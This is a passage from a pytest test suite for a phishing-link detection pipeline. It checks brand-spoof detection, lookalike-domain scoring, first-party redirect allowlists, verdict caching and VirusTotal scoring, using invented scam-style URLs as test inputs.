    # SOMEWHERE on a long page isn't evidence the page presents itself
    # as the brand, unless it sits near an actual mention of that brand.
    text = (
        "Log in to compare our online banking rates against competitors. "
        + ("Unrelated filler text about local branch hours and fees. " * 5)
        + "Google Google Google is mentioned here purely as an example of "
        "a well-known technology company, far from the banking language above."
    )
    assert text.lower().count("google") >= 3  # sanity: clears BRAND_PAGE_SPOOF_MIN

    result = pipeline._brand_page_spoof(text, "some-financial-blog.example", 0.0)

    assert result is None


def test_brand_page_spoof_fires_when_portal_phrase_sits_near_the_brand_mention():
    # Positive counterpart to the proximity test above: the same kept
    # phrase, now placed right next to the brand mentions instead of far
    # away, must still fire - proves the proximity requirement narrows
    # the signal rather than silently disabling it.
    text = (
        "Log in to your Google online banking account now. "
        "Google Google keeps your money safe."
    )
    assert text.lower().count("google") >= 3  # sanity: clears BRAND_PAGE_SPOOF_MIN

    result = pipeline._brand_page_spoof(text, "some-financial-blog.example", 0.0)

    assert result is not None
    assert "Google" in result and "not the official" in result


def test_brand_page_spoof_ignores_log_in_nav_chrome_near_an_unrelated_brand_mention():
    # Real false positive, confirmed live via a second verified-safe-
    # link corpus run (after the "sign in" trim above): "log in" is
    # JUST as generic a nav-menu label as "sign in" was, and the
    # proximity requirement alone doesn't save it - a page's own "Log
    # In" button routinely ends up within BRAND_SPOOF_PORTAL_PROXIMITY
    # chars of an unrelated brand mention once real page structure (nav
    # bar next to a partner-platform list, a footer next to a "follow
    # us on X" link) flattens into one string. Real examples that
    # motivated removing "log in"/"log into" entirely:
    #   claude.com's own nav: "...pricing log in features claude for
    #     microsoft 365 skills..." (distance 61 chars)
    #   dexerto.com's footer: "...see dexerto first on google editorial
    #     standards...archive log in sign up..." (distance 75 chars)
    # Both real pages, zero connection between the login button and the
    # unrelated brand mention.
    text = (
        "Pricing Log In Features Claude for Microsoft 365 Skills Claude Apps. "
        "Claude for Microsoft 365 is available in the app store, alongside "
        "the existing Claude for Microsoft Teams integration."
    )
    assert text.lower().count("microsoft") >= 3  # sanity: clears BRAND_PAGE_SPOOF_MIN

    result = pipeline._brand_page_spoof(text, "claude.com", 0.0)

    assert result is None


def test_analyze_url_caps_stacked_network_signals_at_max_network_points(seeded_vectors, monkeypatch):
    # All four network-derived signals add_network() can currently apply
    # sum to EXACTLY MAX_NETWORK_POINTS (20+10+5+10=45) - today's code has
    # no way to organically exceed the cap, only reach it exactly. This
    # pins that exact boundary with real arithmetic (not just "score went
    # up"), so a FUTURE new network signal added without updating the cap
    # constant would show up as a silent score change here. Zero prior
    # coverage on this cap existed before this test.
    #
    # final_url is deliberately a lexically-CLEAN domain so the separate
    # cross-domain-redirect "rescore" (checks the final URL's own lexical
    # score, added directly to `score`, NOT through add_network/the cap)
    # contributes exactly 0 - isolating the network-points cap from that
    # unrelated addition.
    lexical_base = pipeline.check_url("http://bit.ly/x9")["score"]
    assert lexical_base == 30  # known constant for bit.ly (shortener + no-HTTPS)
    assert pipeline.check_url("https://step-final.harmless-example.com/")["score"] == 0

    fake = _FakeNet(
        reachable=True, status=500, tls_valid=False,
        final_url="https://step-final.harmless-example.com/",
        redirect_chain=[(301, "http://bit.ly/x9"), (301, "http://step2.example.com/"),
                         (301, "http://step3.example.com/"),
                         (301, "https://step-final.harmless-example.com/")],
        cross_domain_redirect=True,
    )

    async def fake_trace(url):
        return fake.result

    async def fake_age(host):
        return None

    async def fake_resolve(host):
        return ["1.2.3.4"]

    monkeypatch.setattr(pipeline.network, "trace", fake_trace)
    monkeypatch.setattr(pipeline, "domain_age_days", fake_age)
    monkeypatch.setattr(pipeline, "resolve_host", fake_resolve)
    monkeypatch.setattr(pipeline, "VIRUSTOTAL_API_KEY", None)

    verdict = asyncio.run(pipeline.analyze_url("http://bit.ly/x9"))

    network_reason_phrases = [
        "redirects to a different domain", "hops before landing",
        "served over plain HTTP", "answered HTTP 500",
    ]
    fired = [p for p in network_reason_phrases if any(p in r for r in verdict["reasons"])]
    assert fired == network_reason_phrases  # all four still reported...
    # ...and the total is exactly lexical_base + capped-network(45) +
    # rescore(0) - proves the cap is the real, exact ceiling, not just
    # "some" cap somewhere.
    assert verdict["score"] == lexical_base + 45


def test_analyze_url_skips_live_vt_lookup_for_a_lexically_clean_url(seeded_vectors, monkeypatch):
    # VT quota gate: live=(score > 0). A lexically-clean URL that
    # resolves fine with no red flags must call VT with live=False
    # (cache-only, no quota spent) - the actual quota-protection the
    # docstring claims, not just "VT gets skipped for official brands."
    seen_live = {}

    async def spy_lookup(url, key, live=True):
        seen_live["value"] = live
        return None

    async def fake_trace(url):
        return _FakeNet(reachable=True, status=200, tls_valid=True,
                        page_text="a perfectly ordinary page").result

    async def fake_age(host):
        return 2000

    async def fake_resolve(host):
        return ["1.2.3.4"]

    monkeypatch.setattr(pipeline.threat_intel, "lookup", spy_lookup)
    monkeypatch.setattr(pipeline.network, "trace", fake_trace)
    monkeypatch.setattr(pipeline, "domain_age_days", fake_age)
    monkeypatch.setattr(pipeline, "resolve_host", fake_resolve)
    monkeypatch.setattr(pipeline, "VIRUSTOTAL_API_KEY", "fake-key")

    asyncio.run(pipeline.analyze_url("https://some-ordinary-blog.com/"))

    assert seen_live == {"value": False}


def test_check_message_full_sees_link_hidden_entirely_behind_entity_text(seeded_vectors, monkeypatch):
    # The message's VISIBLE text has no URL in it at all ("Click here")
    # - extract_urls() alone would return zero verdicts here, exactly
    # the invisible-link blind spot this closes. The real destination
    # only exists in the Telegram TEXT_LINK entity, passed as hidden_links.
    _stub_out_network(monkeypatch)
    assert extract_urls("Click here") == []

    verdicts = asyncio.run(pipeline.check_message_full(
        "Click here",
        hidden_links=[("Click here", "http://free-prize-winner.tk/claim")],
    ))

    assert len(verdicts) == 1
    assert verdicts[0]["host"] == "free-prize-winner.tk"


def test_check_message_full_scores_anchor_text_mismatch(seeded_vectors, monkeypatch):
    # Display text claims the official bank domain; the entity's real
    # url goes somewhere else entirely - the deceptive case the
    # mismatch check specifically targets. Two verdicts come back: the
    # visible display text ("https://ababank.com" is real text in the
    # message) gets its own normal check, and the hidden entity's
    # actual destination gets analyzed separately with the mismatch
    # reason attached.
    _stub_out_network(monkeypatch)

    verdicts = asyncio.run(pipeline.check_message_full(
        "https://ababank.com",
        hidden_links=[("https://ababank.com", "http://ababank-secure-login.tk/verify")],
    ))

    assert len(verdicts) == 2
    phishing = next(v for v in verdicts if v["host"] == "ababank-secure-login.tk")
    assert phishing["level"] == "dangerous"
    assert any("not the real destination" in r for r in phishing["reasons"])


def test_check_message_full_does_not_duplicate_a_link_already_visible(seeded_vectors, monkeypatch):
    # If the same url is already in the visible text, the hidden_links
    # entry for it must not produce a second, duplicate verdict.
    _stub_out_network(monkeypatch)

    verdicts = asyncio.run(pipeline.check_message_full(
        "check https://ababank.com please",
        hidden_links=[("https://ababank.com", "https://ababank.com")],
    ))

    assert len(verdicts) == 1


def test_analyze_url_does_not_flag_near_dup_on_degenerate_page_text(seeded_vectors, monkeypatch):
    # Regression test for a real false positive hit live: a bot-blocked
    # /CAPTCHA/JS-only page (common on sites with real anti-bot defenses
    # - this exact case was Amazon) returns near-empty text after
    # tag-stripping. MinHash on near-empty text is degenerate - two
    # completely UNRELATED sites that both happen to return "\n" as
    # their page text used to hash to ~100% "similar", with zero actual
    # content in common, and Amazon got flagged as near-identical to an
    # unrelated typosquat domain purely because of this.
    vectors.store_page_signature("totally-unrelated-site.tk", "\n")

    async def near_empty_trace(url):
        return _FakeNet(reachable=True, status=200, tls_valid=True,
                         final_url="https://www.amazon.com/",
                         page_html="<html></html>", page_text="\n").result

    async def fake_age(host):
        return None

    async def fake_resolve(host):
        return ["103.1.2.3"]

    monkeypatch.setattr(pipeline.network, "trace", near_empty_trace)
    monkeypatch.setattr(pipeline, "domain_age_days", fake_age)
    monkeypatch.setattr(pipeline, "resolve_host", fake_resolve)

    verdict = asyncio.run(pipeline.analyze_url("https://www.amazon.com/"))

    assert not any("near-identical" in r for r in verdict["reasons"])


def test_analyze_url_does_not_flag_near_dup_on_generic_challenge_page(seeded_vectors, monkeypatch):
    # A second, sneakier version of the same bug: a bot-challenge page
    # (Cloudflare "Checking your browser...", reCAPTCHA wall) is real,
    # non-empty text - not caught by an empty-text guard alone - but
    # it's IDENTICAL boilerplate across countless unrelated sites.
    # Confirmed live: linkedin.com's real 191-char challenge page still
    # spuriously matched another site's copy of the same text.
    challenge_page = "Checking your browser before accessing the site.\n" \
                      "This process is automatic. Please wait a moment."
    vectors.store_page_signature("totally-unrelated-site.tk", challenge_page)

    async def challenge_trace(url):
        return _FakeNet(reachable=True, status=200, tls_valid=True,
                         final_url="https://www.linkedin.com/",
                         page_html="<html></html>", page_text=challenge_page).result

    async def fake_age(host):
        return None

    async def fake_resolve(host):
        return ["103.1.2.3"]

    monkeypatch.setattr(pipeline.network, "trace", challenge_trace)
    monkeypatch.setattr(pipeline, "domain_age_days", fake_age)
    monkeypatch.setattr(pipeline, "resolve_host", fake_resolve)

    verdict = asyncio.run(pipeline.analyze_url("https://www.linkedin.com/"))

    assert not any("near-identical" in r for r in verdict["reasons"])


def test_analyze_url_merges_network_signals(seeded_vectors, monkeypatch):
    fake = _FakeNet(
        reachable=True, status=200, tls_valid=True,
        final_url="http://free-prize-winner.tk/claim",
        redirect_chain=[(301, "http://bit.ly/x9")],
        cross_domain_redirect=True,
    )
    async def fake_trace(url):
        return fake.result

    async def fake_age(host):
        return 5          # registered 5 days ago

    async def fake_resolve(host):
        return ["103.1.2.3"]

    monkeypatch.setattr(pipeline.network, "trace", fake_trace)
    monkeypatch.setattr(pipeline, "domain_age_days", fake_age)
    monkeypatch.setattr(pipeline, "resolve_host", fake_resolve)

    verdict = asyncio.run(pipeline.analyze_url("http://bit.ly/x9"))

    assert verdict["level"] in ("suspicious", "dangerous")
    joined = " ".join(verdict["reasons"])
    assert "redirects to a different domain" in joined
    assert "registered only" in joined
    assert any("final destination" in d for d in verdict["detail"])


def test_analyze_url_does_not_score_a_known_rebrand_redirect(seeded_vectors, monkeypatch):
    # Real false positive, confirmed live via the verified-safe-link
    # corpus test: a plain twitter.com link scored "Suspicious" (30)
    # purely for following Twitter/X Corp's own real, permanent 2023
    # rebrand redirect to x.com - registered_domain(twitter.com) !=
    # registered_domain(x.com), so the general cross-domain-redirect
    # check (correctly built to catch bit.ly -> free-iphone-winner.tk)
    # fired on every single twitter.com link that exists.
    # KNOWN_FIRST_PARTY_REDIRECTS exists specifically to make this ONE
    # hand-verified pair inert, without weakening the general check for
    # anything else.
    fake = _FakeNet(
        reachable=True, status=200, tls_valid=True,
        final_url="https://x.com/nodepractices",
        redirect_chain=[(301, "https://twitter.com/nodepractices")],
        cross_domain_redirect=True,
    )

    async def fake_trace(url):
        return fake.result

    async def fake_age(host):
        return None

    async def fake_resolve(host):
        return ["1.2.3.4"]

    monkeypatch.setattr(pipeline.network, "trace", fake_trace)
    monkeypatch.setattr(pipeline, "domain_age_days", fake_age)
    monkeypatch.setattr(pipeline, "resolve_host", fake_resolve)
    monkeypatch.setattr(pipeline, "VIRUSTOTAL_API_KEY", None)

    verdict = asyncio.run(pipeline.analyze_url("https://twitter.com/nodepractices"))

    assert not any("redirects to a different domain" in r for r in verdict["reasons"])
    assert verdict["level"] == "safe"


def test_analyze_url_still_scores_an_unrelated_cross_domain_redirect(seeded_vectors, monkeypatch):
    # The allowlist must not accidentally widen into "any redirect off
    # twitter.com is fine" - only the exact known destination (x.com)
    # is exempt. A twitter.com short-link redirecting somewhere else
    # entirely must still be scored normally.
    fake = _FakeNet(
        reachable=True, status=200, tls_valid=True,
        final_url="http://free-prize-winner.tk/claim",
        redirect_chain=[(301, "https://twitter.com/t.co/abc123")],
        cross_domain_redirect=True,
    )

    async def fake_trace(url):
        return fake.result

    async def fake_age(host):
        return 5

    async def fake_resolve(host):
        return ["1.2.3.4"]

    monkeypatch.setattr(pipeline.network, "trace", fake_trace)
    monkeypatch.setattr(pipeline, "domain_age_days", fake_age)
    monkeypatch.setattr(pipeline, "resolve_host", fake_resolve)
    monkeypatch.setattr(pipeline, "VIRUSTOTAL_API_KEY", None)

    verdict = asyncio.run(pipeline.analyze_url("https://twitter.com/t.co/abc123"))

    assert any("redirects to a different domain" in r for r in verdict["reasons"])


@pytest.mark.parametrize("source_url,final_url", [
    ("https://m.me/cocacola", "https://www.messenger.com/t/cocacola"),
    ("https://fb.me/e/abc123", "https://www.facebook.com/event_invite/abc123/"),
    ("https://fb.com/zuck", "https://www.facebook.com/zuck"),
    ("https://discord.gg/python", "https://discord.com/invite/python"),
    ("https://redd.it/1abcde", "https://www.reddit.com/r/python/comments/1abcde/"),
    ("https://amzn.to/4fqvn0D", "https://www.amazon.com/dp/B0ABCDEF"),
    ("https://wa.me/85512345678", "https://api.whatsapp.com/send/?phone=85512345678"),
    ("https://youtu.be/dQw4w9WgXcQ", "https://www.youtube.com/watch?v=dQw4w9WgXcQ"),
])
def test_analyze_url_does_not_score_other_known_first_party_redirects(
    seeded_vectors, monkeypatch, source_url, final_url
):
    # Real false positives, all confirmed live: m.me, fb.me, fb.com,
    # discord.gg, redd.it, amzn.to, wa.me, and youtu.be are each a real
    # platform's OWN real short-link/invite domain, and each genuinely
    # redirects to that same platform's main site - not a scam redirect.
    # Before KNOWN_FIRST_PARTY_REDIRECTS covered these, m.me scored
    # 80/dangerous ("a fake of Telegram"), fb.com scored 65/dangerous
    # ("a fake of X (Twitter)"), fb.me scored 65/dangerous ("a fake of
    # Telegram") - partly the separate short-domain-typosquat bug, see
    # MIN_TYPOSQUAT_DOMAIN_LENGTH - and discord.gg/redd.it/amzn.to/
    # wa.me/youtu.be all scored Suspicious purely for their real
    # redirect (youtu.be also picked up a spurious single-engine
    # VirusTotal flag on top, unrelated to this fix).
    from urllib.parse import urlsplit
    source_host = urlsplit(source_url).hostname

    fake = _FakeNet(
        reachable=True, status=200, tls_valid=True,
        final_url=final_url,
        redirect_chain=[(301, source_url)],
        cross_domain_redirect=True,
    )

    async def fake_trace(url):
        return fake.result

    async def fake_age(host):
        return None

    async def fake_resolve(host):
        return ["1.2.3.4"]

    monkeypatch.setattr(pipeline.network, "trace", fake_trace)
    monkeypatch.setattr(pipeline, "domain_age_days", fake_age)
    monkeypatch.setattr(pipeline, "resolve_host", fake_resolve)
    monkeypatch.setattr(pipeline, "VIRUSTOTAL_API_KEY", None)

    verdict = asyncio.run(pipeline.analyze_url(source_url))

    assert not any("redirects to a different domain" in r for r in verdict["reasons"]), source_host
    assert not any("looks like a fake of" in r or "not the official" in r for r in verdict["reasons"]), source_host
    assert verdict["level"] == "safe", source_host


def test_check_url_flags_a_real_discord_impersonation():
    # Discord wasn't a protected brand at all before this session, despite
    # being a very common real impersonation target (fake Nitro/giveaway
    # scams). Confirms adding it as a real brand actually adds detection
    # power, not just false-positive suppression for its own domains.
    v = check_url("http://discord-nitro-free.gift/claim")

    assert any("Discord" in r for r in v["reasons"])


def test_check_url_flags_a_real_whatsapp_and_youtube_impersonation():
    # WhatsApp already had a protected .com entry, but "wa" (wa.me's
    # brand_name root) is too short to buried-name-match on its own -
    # this pins that the FULL "whatsapp" root (from whatsapp.com) still
    # catches a buried-name impersonation regardless of wa.me existing
    # alongside it. YouTube was not a protected brand at all before this
    # session (only generic "google.com" was) despite being a very
    # common real impersonation target (fake copyright-strike/
    # monetization scams).
    v = check_url("http://whatsapp-account-verify.tk/login")
    assert any("WhatsApp" in r for r in v["reasons"])

    v = check_url("http://youtube-copyright-strike.ml/appeal")
    assert any("YouTube" in r for r in v["reasons"])


def test_check_url_does_not_flag_googles_own_shortlink_domain():
    # g.co is real, confirmed live to redirect to legitimate Google
    # infrastructure - see the multi-destination redirect test below for
    # the redirect-scoring half; this test just pins the lexical/brand
    # half (typosquat/buried-name immunity), which g.co gets from being
    # a PROTECTED_BRANDS entry regardless of where any given path
    # redirects to.
    v = check_url("https://g.co/kgs/abc123")

    assert not any("not the official" in r or "looks like a fake of" in r for r in v["reasons"])


@pytest.mark.parametrize("final_url", [
    "https://ai.google.dev",           # g.co/gemini
    "https://www.google.com/photos/",  # g.co/photos
    "https://ai.google/",              # g.co/ai - Google owns the .google gTLD too
])
def test_analyze_url_does_not_score_any_of_googles_confirmed_shortlink_destinations(
    seeded_vectors, monkeypatch, final_url
):
    # Real false positive, confirmed live: g.co (Google's own shortlink
    # domain) doesn't redirect to one fixed destination - different
    # paths land on different genuinely real Google-owned registered
    # domains. Before KNOWN_FIRST_PARTY_REDIRECTS supported multiple
    # destinations per source, g.co/gemini scored 60/dangerous purely
    # for following that real redirect. This test proves all three
    # confirmed-live destinations are covered, not just one.
    fake = _FakeNet(
        reachable=True, status=200, tls_valid=True,
        final_url=final_url,
        redirect_chain=[(301, "https://g.co/gemini")],
        cross_domain_redirect=True,
    )

    async def fake_trace(url):
        return fake.result

    async def fake_age(host):
        return None

    async def fake_resolve(host):
        return ["1.2.3.4"]

    monkeypatch.setattr(pipeline.network, "trace", fake_trace)
    monkeypatch.setattr(pipeline, "domain_age_days", fake_age)
    monkeypatch.setattr(pipeline, "resolve_host", fake_resolve)
    monkeypatch.setattr(pipeline, "VIRUSTOTAL_API_KEY", None)

    verdict = asyncio.run(pipeline.analyze_url("https://g.co/gemini"))

    assert not any("redirects to a different domain" in r for r in verdict["reasons"]), final_url
    assert verdict["level"] == "safe", final_url


def test_analyze_url_still_scores_a_redirect_off_g_co_to_an_unknown_destination(seeded_vectors, monkeypatch):
    # The multi-destination allowlist must not accidentally widen into
    # "any redirect off g.co is fine" - only its 3 confirmed-live real
    # destinations are exempt. A g.co short link redirecting somewhere
    # completely unrelated must still be scored normally.
    fake = _FakeNet(
        reachable=True, status=200, tls_valid=True,
        final_url="http://free-prize-winner.tk/claim",
        redirect_chain=[(301, "https://g.co/fake")],
        cross_domain_redirect=True,
    )

    async def fake_trace(url):
        return fake.result

    async def fake_age(host):
        return 5

    async def fake_resolve(host):
        return ["1.2.3.4"]

    monkeypatch.setattr(pipeline.network, "trace", fake_trace)
    monkeypatch.setattr(pipeline, "domain_age_days", fake_age)
    monkeypatch.setattr(pipeline, "resolve_host", fake_resolve)
    monkeypatch.setattr(pipeline, "VIRUSTOTAL_API_KEY", None)

    verdict = asyncio.run(pipeline.analyze_url("https://g.co/fake"))

    assert any("redirects to a different domain" in r for r in verdict["reasons"])


def test_analyze_url_survives_total_network_failure(seeded_vectors, monkeypatch):
    async def boom(url):
        raise RuntimeError("network down")

    async def none_resolve(host):
        return None

    async def none_age(host):
        return None

    monkeypatch.setattr(pipeline.network, "trace", boom)
    monkeypatch.setattr(pipeline, "resolve_host", none_resolve)
    monkeypatch.setattr(pipeline, "domain_age_days", none_age)

    verdict = asyncio.run(pipeline.analyze_url("example.com"))
    assert "does not resolve" in " ".join(verdict["reasons"])


def test_analyze_url_flags_malformed_protocol(seeded_vectors, monkeypatch):
    async def dead_net(url):
        return _FakeNet(error="connection refused").result

    async def none_resolve(host):
        return None

    async def none_age(host):
        return None

    monkeypatch.setattr(pipeline.network, "trace", dead_net)
    monkeypatch.setattr(pipeline, "resolve_host", none_resolve)
    monkeypatch.setattr(pipeline, "domain_age_days", none_age)

    clean = asyncio.run(pipeline.analyze_url("ababank.com"))
    malformed = asyncio.run(pipeline.analyze_url("ababank.com", malformed_protocol=True))

    assert malformed["score"] > clean["score"]
    assert any("malformed protocol" in r for r in malformed["reasons"])
    assert not any("malformed protocol" in r for r in clean["reasons"])


@pytest.mark.asyncio
async def test_check_message_full_detects_malformed_protocol_in_the_raw_text(seeded_vectors, monkeypatch):
    # Regression for the mentor-flagged signal: URL_REGEX's own optional
    # scheme group silently drops "http//"/"https//" (see
    # has_malformed_protocol's docstring), so analyze_url alone never
    # sees it unless check_message_full checks the RAW text itself and
    # threads the flag through.
    async def dead_net(url):
        return _FakeNet(error="connection refused").result

    async def none_resolve(host):
        return None

    async def none_age(host):
        return None

    monkeypatch.setattr(pipeline.network, "trace", dead_net)
    monkeypatch.setattr(pipeline, "resolve_host", none_resolve)
    monkeypatch.setattr(pipeline, "domain_age_days", none_age)

    verdicts = await pipeline.check_message_full("claim now http//free-prize-winner.tk/claim")

    assert len(verdicts) == 1
    assert any("malformed protocol" in r for r in verdicts[0]["reasons"])


# --- exact-match verdict cache (mentor-flagged: "same" not "similar") -----

def test_analyze_url_second_call_hits_cache_and_skips_network(seeded_vectors, monkeypatch):
    calls = {"trace": 0}

    async def counting_trace(url):
        calls["trace"] += 1
        return _FakeNet(reachable=True, status=200, tls_valid=True).result

    async def fake_age(host):
        return None

    async def fake_resolve(host):
        return ["103.1.2.3"]

    monkeypatch.setattr(pipeline.network, "trace", counting_trace)
    monkeypatch.setattr(pipeline, "domain_age_days", fake_age)
    monkeypatch.setattr(pipeline, "resolve_host", fake_resolve)

    first = asyncio.run(pipeline.analyze_url("http://free-prize-winner.tk/claim"))
    assert calls["trace"] == 1

    second = asyncio.run(pipeline.analyze_url("http://free-prize-winner.tk/claim"))
    assert calls["trace"] == 1  # no second live fetch - served from cache
    assert second["score"] == first["score"]
    assert second["reasons"] == first["reasons"]


def test_analyze_url_cache_is_keyed_exactly_not_by_similarity(seeded_vectors, monkeypatch):
    # The whole point of "same" not "similar": a lookalike domain must
    # run its own full check, never inherit another URL's cached verdict.
    calls = {"trace": 0}

    async def counting_trace(url):
        calls["trace"] += 1
        return _FakeNet(reachable=True, status=200, tls_valid=True).result

    async def fake_age(host):
        return None

    async def fake_resolve(host):
        return ["103.1.2.3"]

    monkeypatch.setattr(pipeline.network, "trace", counting_trace)
    monkeypatch.setattr(pipeline, "domain_age_days", fake_age)
    monkeypatch.setattr(pipeline, "resolve_host", fake_resolve)

    asyncio.run(pipeline.analyze_url("http://ababank-secure-login.tk/verify"))
    assert calls["trace"] == 1

    asyncio.run(pipeline.analyze_url("http://ababank-secure-login2.tk/verify"))
    assert calls["trace"] == 2  # different URL - must NOT reuse the cache


def test_analyze_url_official_brand_never_uses_the_cache(seeded_vectors, monkeypatch):
    calls = {"trace": 0}

    async def counting_trace(url):
        calls["trace"] += 1
        return _FakeNet(reachable=True, status=200, tls_valid=True,
                         final_url="https://www.google.com/").result

    async def fake_age(host):
        return 10000

    async def fake_resolve(host):
        return ["8.8.8.8"]

    monkeypatch.setattr(pipeline.network, "trace", counting_trace)
    monkeypatch.setattr(pipeline, "domain_age_days", fake_age)
    monkeypatch.setattr(pipeline, "resolve_host", fake_resolve)

    asyncio.run(pipeline.analyze_url("https://www.google.com/"))
    asyncio.run(pipeline.analyze_url("https://www.google.com/"))
    assert calls["trace"] == 2  # official brand always re-checked live, never cached


def test_analyze_url_message_context_signals_apply_fresh_on_a_cache_hit(seeded_vectors, monkeypatch):
    # malformed_protocol/display_text must never get baked into the
    # cached verdict - two different messages linking the same URL can
    # have different framing.
    async def fake_trace(url):
        return _FakeNet(reachable=True, status=200, tls_valid=True).result

    async def fake_age(host):
        return None

    async def fake_resolve(host):
        return ["103.1.2.3"]

    monkeypatch.setattr(pipeline.network, "trace", fake_trace)
    monkeypatch.setattr(pipeline, "domain_age_days", fake_age)
    monkeypatch.setattr(pipeline, "resolve_host", fake_resolve)

    plain = asyncio.run(pipeline.analyze_url("http://free-prize-winner.tk/x"))
    malformed = asyncio.run(pipeline.analyze_url(
        "http://free-prize-winner.tk/x", malformed_protocol=True))

    assert malformed["score"] == plain["score"] + 15
    assert any("malformed protocol" in r for r in malformed["reasons"])
    assert not any("malformed protocol" in r for r in plain["reasons"])


# --- self-learning memory (Telegram links -> future reference) -----------

def test_flagged_link_is_remembered_for_future(seeded_vectors, monkeypatch):
    """A dangerous-looking link must be stored as kind='seen' with its
    verdict level, so the vector store grows as the bot scans Telegram
    traffic."""
    async def dead_net(url):
        return _FakeNet(error="connection refused").result

    async def none_resolve(host):
        return ["1.2.3.4"]

    async def old_domain(host):
        return 2000

    monkeypatch.setattr(pipeline.network, "trace", dead_net)
    monkeypatch.setattr(pipeline, "resolve_host", none_resolve)
    monkeypatch.setattr(pipeline, "domain_age_days", old_domain)

    verdict = asyncio.run(pipeline.analyze_url("http://ababank-secure-login-verify-account.tk"))

    seen_rows = [
        (kind, key, label) for (kind, key), (label, _vec) in seeded_vectors.rows.items()
        if kind == "seen"
    ]
    assert seen_rows, "flagged link was not remembered"
    assert seen_rows[0][2] == verdict["level"]


def test_second_lookalike_link_matches_first_flagged(seeded_vectors, monkeypatch):
    """The whole point of storing seen links: check a scam link once,
    then a lookalike must earn extra points via similarity to it."""
    async def dead_net(url):
        return _FakeNet(error="connection refused").result

    async def none_resolve(host):
        return None                      # unresolvable -> +25 both times

    async def unknown_age(host):
        return None                      # no RDAP data -> age-neutral

    monkeypatch.setattr(pipeline.network, "trace", dead_net)
    monkeypatch.setattr(pipeline, "resolve_host", none_resolve)
    monkeypatch.setattr(pipeline, "domain_age_days", unknown_age)

    first = asyncio.run(pipeline.analyze_url(
        "http://ababank-secure-login-verify-account.tk"))
    assert first["score"] > 0            # flagged the first time by lexical rules

    second = asyncio.run(pipeline.analyze_url(
        "http://ababank-secure-login-verify-account2.tk"))

    joined = " ".join(second["reasons"])
    assert "previously flagged" in joined
    assert second["score"] >= first["score"] + 20   # memory made it stricter
    assert any("similarity" in d and "earlier flagged link" in d for d in second["detail"])


# --- false-positive regressions (the google.com incident) ----------------

def test_official_brand_survives_plain_http_www_and_poisoned_memory(seeded_vectors, monkeypatch):
    """google.com over plain http redirecting to www.google.com must stay
    SAFE even if the memory store already contains a poisoned 'dangerous'
    seen-row for google (which a past bug created)."""
    # Poison the memory exactly like the bug did.
    seeded_vectors.rows[("seen", "http://www.google.com/")] = (
        "dangerous", vectors.embed("http://www.google.com/")
    )

    async def fake_trace(url):
        return _FakeNet(
            reachable=True, status=200,
            final_url="http://www.google.com/",
            redirect_chain=[(301, "http://google.com")],
            cross_domain_redirect=False,     # same registrable domain!
            tls_valid=False,                 # plain HTTP, NOT a cert failure
        ).result

    async def fake_resolve(host):
        return ["142.250.4.100"]

    async def old_age(host):
        return 10000

    monkeypatch.setattr(pipeline.network, "trace", fake_trace)
    monkeypatch.setattr(pipeline, "resolve_host", fake_resolve)
    monkeypatch.setattr(pipeline, "domain_age_days", old_age)

    v = asyncio.run(pipeline.analyze_url("google.com"))

    assert v["level"] == "safe"
    assert "previously flagged" not in " ".join(v["reasons"])
    assert "certificate is invalid" not in " ".join(v["reasons"])
    assert "warning signs" not in " ".join(v["reasons"])      # www hop ignored


def test_cross_domain_shortener_still_rescored(seeded_vectors, monkeypatch):
    """Guard the guard: a REAL cross-domain redirect must still rescore."""
    async def fake_trace(url):
        return _FakeNet(
            reachable=True, status=200,
            final_url="http://free-prize-winner.tk/claim",
            redirect_chain=[(301, "http://bit.ly/x9")],
            cross_domain_redirect=True,
            tls_valid=True,
        ).result

    async def fake_resolve(host):
        return ["1.2.3.4"]

    async def old_age(host):
        return 3000

    monkeypatch.setattr(pipeline.network, "trace", fake_trace)
    monkeypatch.setattr(pipeline, "resolve_host", fake_resolve)
    monkeypatch.setattr(pipeline, "domain_age_days", old_age)

    v = asyncio.run(pipeline.analyze_url("http://bit.ly/x9"))
    assert v["level"] != "safe"
    assert any("final destination" in d for d in v["detail"])


# --- Flow 3: VirusTotal threat intelligence -------------------------------

def test_vt_score_thresholds():
    # Many engines -> strongest signal
    assert threat_intel.score({"malicious": 12, "suspicious": 0, "total": 94})[0] == 50
    # A couple of engines -> strong but not max
    assert threat_intel.score({"malicious": 2, "suspicious": 0, "total": 94})[0] == 40
    # Single engine -> moderate (could be false positive)
    assert threat_intel.score({"malicious": 1, "suspicious": 0, "total": 94})[0] == 25
    # Only suspicious -> mild
    assert threat_intel.score({"malicious": 0, "suspicious": 3, "total": 94})[0] == 15
    # Clean or empty -> no opinion
    assert threat_intel.score({"malicious": 0, "suspicious": 0, "total": 94}) is None
    assert threat_intel.score({}) is None


def test_vt_cache_roundtrip(tmp_path, monkeypatch):
    db = str(tmp_path / "vt.db")
    monkeypatch.setattr(threat_intel, "SCAN_LOG_DB", db)

    assert threat_intel._cache_get("abc") is None
    threat_intel._cache_put("abc", {"malicious": 3, "suspicious": 1, "total": 90})
    hit = threat_intel._cache_get("abc")
    assert hit == {"malicious": 3, "suspicious": 1, "total": 90}


def test_vt_lookup_prefers_cache_and_needs_key(tmp_path, monkeypatch):
    db = str(tmp_path / "vt2.db")
    monkeypatch.setattr(threat_intel, "SCAN_LOG_DB", db)

    url = "http://cached-example.com/"
    threat_intel._cache_put(threat_intel._url_identifier(url),
                            {"malicious": 7, "suspicious": 0, "total": 80})

    class _ForbiddenClient:
        def __init__(self, *a, **k):
            raise AssertionError("HTTP client must not be constructed on a cache hit")

    monkeypatch.setattr(threat_intel.httpx, "AsyncClient", _ForbiddenClient)

    # Cache hit: no HTTP at all, even with live=False.
    stats = asyncio.run(threat_intel.lookup(url, api_key="dummy", live=False))
    assert stats["malicious"] == 7

    # No API key configured -> always None, no exception.
    assert asyncio.run(threat_intel.lookup("x", api_key=None)) is None


def test_analyze_url_uses_vt_verdict(seeded_vectors, monkeypatch):
    """VT flagging a URL must add points + reason in the merged verdict."""
    async def fake_lookup(url, key, live=True):
        return {"malicious": 10, "suspicious": 1, "total": 94}

    async def clean_trace(url):
        return _FakeNet(reachable=True, status=200, tls_valid=True,
                        page_text="hello world page").result

    async def fine_resolve(host):
        return ["1.2.3.4"]

    async def old_age(host):
        return 4000

    monkeypatch.setattr(pipeline.threat_intel, "lookup", fake_lookup)
    monkeypatch.setattr(pipeline.network, "trace", clean_trace)
    monkeypatch.setattr(pipeline, "resolve_host", fine_resolve)
    monkeypatch.setattr(pipeline, "domain_age_days", old_age)
    monkeypatch.setattr(pipeline, "VIRUSTOTAL_API_KEY", "fake-key")

